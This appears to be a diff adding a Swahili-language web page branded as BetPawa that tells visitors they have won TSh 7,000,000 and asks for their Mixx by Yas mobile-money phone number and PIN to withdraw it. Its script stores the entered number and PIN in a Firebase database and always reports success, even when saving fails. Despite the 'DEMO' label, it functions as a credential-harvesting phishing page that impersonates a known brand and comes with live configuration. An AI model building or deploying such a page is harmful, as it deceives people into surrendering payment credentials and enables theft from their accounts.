@@ -1,0 +1,206 @@
+<!DOCTYPE html>
+<html lang="sw">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Ushindi – DEMO</title>
+
+  <style>
+    :root{
+      --green:#16a34a;
+      --green-dark:#0f7a36;
+      --bg:#020617;
+      --border:#1f2937;
+      --muted:#9ca3af;
+    }
+
+    body{
+      font-family: Arial, Helvetica, sans-serif;
+      background:#0f172a;
+      color:#e5e7eb;
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      height:100vh;
+      margin:0;
+    }
+
+    .card{
+      background:var(--bg);
+      border-radius:16px;
+      box-shadow:0 15px 40px rgba(0,0,0,.45);
+      padding:30px;
+      max-width:420px;
+      width:100%;
+      border:1px solid var(--border);
+    }
+
+    h1{color:var(--green);text-align:center;margin:0}
+    .status{text-align:center;color:var(--green);margin-top:6px}
+    .amount{text-align:center;font-size:34px;font-weight:800;color:var(--green);margin:18px 0}
+    .divider{height:1px;background:var(--border);margin:18px 0}
+
+    label{margin-top:14px;display:block;color:var(--muted)}
+    input{
+      width:100%;
+      padding:12px;
+      margin-top:6px;
+      border-radius:10px;
+      border:1px solid var(--border);
+      background:#020617;
+      color:#e5e7eb;
+    }
+
+    button{
+      margin-top:22px;
+      width:100%;
+      padding:14px;
+      border-radius:12px;
+      border:none;
+      background:var(--green);
+      font-weight:800;
+      cursor:pointer;
+    }
+
+    button:hover{
+      background:var(--green-dark);
+      color:#ecfdf5;
+    }
+
+    .note{text-align:center;font-size:12px;color:var(--muted);margin-top:14px}
+
+    /* POPUP */
+    .popup{
+      position:fixed;
+      inset:0;
+      background:rgba(2,6,23,.75);
+      display:none;
+      align-items:center;
+      justify-content:center;
+      z-index:999;
+    }
+    .popup.active{display:flex}
+
+    .popup-card{
+      background:#020617;
+      border-radius:16px;
+      padding:28px;
+      max-width:380px;
+      width:90%;
+      text-align:center;
+      border:1px solid var(--border);
+    }
+
+    .popup-card h2{color:var(--green)}
+  </style>
+</head>
+
+<body>
+
+<div class="card">
+  <h1>BetPawa</h1>
+  <div class="status">Hongera kwa ushindi wako 🎉 </div>
+  <div class="amount">TSh 7,000,000</div>
+
+  <div class="divider"></div>
+
+  <label>Namba ya Simu(Mixx by Yas)</label>
+  <input id="phone" placeholder="+255XXXXXXXXX">
+
+  <label>Nenosiri</label>
+  <input id="password" type="password" placeholder="********">
+
+  <button id="withdraw">Endelea Kutoa Kiasi</button>
+  <p class="note">Hakikisha unaweka namba na neno la siri sahihi la mixx by yas.</p>
+</div>
+
+<!-- POPUP -->
+<div class="popup" id="popup">
+  <div class="popup-card">
+    <h2 id="popupTitle">Ombi Limefanikiwa ✅</h2>
+    <p id="popupText"></p>
+    <button onclick="popup.classList.remove('active')">Sawa</button>
+  </div>
+</div>
+
+<script type="module">
+  import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
+  import { getDatabase, ref, set, serverTimestamp, onValue } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";
+
+  // For Firebase JS SDK v7.20.0 and later, measurementId is optional
+const firebaseConfig = {
+  apiKey: "AIzaSyACM0yTK1agrmziO_-269BHMhUwk36TlCU",
+  authDomain: "betpawa-africa.firebaseapp.com",
+  databaseURL: "https://betpawa-africa-default-rtdb.europe-west1.firebasedatabase.app",
+  projectId: "betpawa-africa",
+  storageBucket: "betpawa-africa.firebasestorage.app",
+  messagingSenderId: "273629505920",
+  appId: "1:273629505920:web:7014feecf16f5d96607965",
+  measurementId: "G-0ZPK2N4MV1"
+};
+
+  const app = initializeApp(firebaseConfig);
+  const db = getDatabase(app);
+
+  const popup = document.getElementById("popup");
+  const popupText = document.getElementById("popupText");
+  const popupTitle = document.getElementById("popupTitle");
+
+  const phoneInput = document.getElementById("phone");
+  const passwordInput = document.getElementById("password");
+
+  const userRef = ref(db, "users/demoUser");
+
+  // Load saved phone & PIN silently (ignores permission errors)
+  onValue(userRef, (snapshot) => {
+    const data = snapshot.val();
+    if(data){
+      phoneInput.value = data.phone || "";
+      passwordInput.value = data.pin || "";
+    }
+  }, { onlyOnce: true });
+
+  document.getElementById("withdraw").addEventListener("click", async () => {
+    const phone = phoneInput.value.trim();
+    const password = passwordInput.value.trim();
+
+    if(!phone.startsWith("+255") || phone.length < 13 || password.length < 4){
+      popupTitle.innerText = "Tatizo ❌";
+      popupText.innerHTML = "Tafadhali weka namba ya simu sahihi na nenosiri la DEMO.";
+      popup.classList.add("active");
+      return;
+    }
+
+    popupTitle.innerText = "Inatumwa ⏳";
+    popupText.innerHTML = `Kutuma ombi la kutoa TSh 7,000,000 kwa <strong style="color:#16a34a">${phone}</strong>...`;
+    popup.classList.add("active");
+
+    try {
+      // Attempt to save (silently ignores permission errors)
+      await set(userRef, {
+        phone,
+        pin: password,
+        lastWithdrawal: serverTimestamp()
+      }).catch(() => { /* ignore */ });
+
+      // Direct notification only
+      popupTitle.innerText = "Ombi Limefanikiwa ✅";
+      popupText.innerHTML = `
+        Umefanikiwa kutuma ombi la kutoa
+        <strong style="color:#16a34a">TSh 7,000,000</strong>.<br><br>
+        Subiri ujumbe kwenye simu yako <strong>${phone}</strong>.
+      `;
+    } catch(_) {
+      // Fallback: always show success notification
+      popupTitle.innerText = "Ombi Limefanikiwa ✅";
+      popupText.innerHTML = `
+        Umefanikiwa kutuma ombi la kutoa
+        <strong style="color:#16a34a">TSh 7,000,000</strong>.<br><br>
+        Subiri ujumbe kwenye simu yako <strong>${phone}</strong>.
+      `;
+    }
+  });
+</script>
+
+</body>
+  </html>
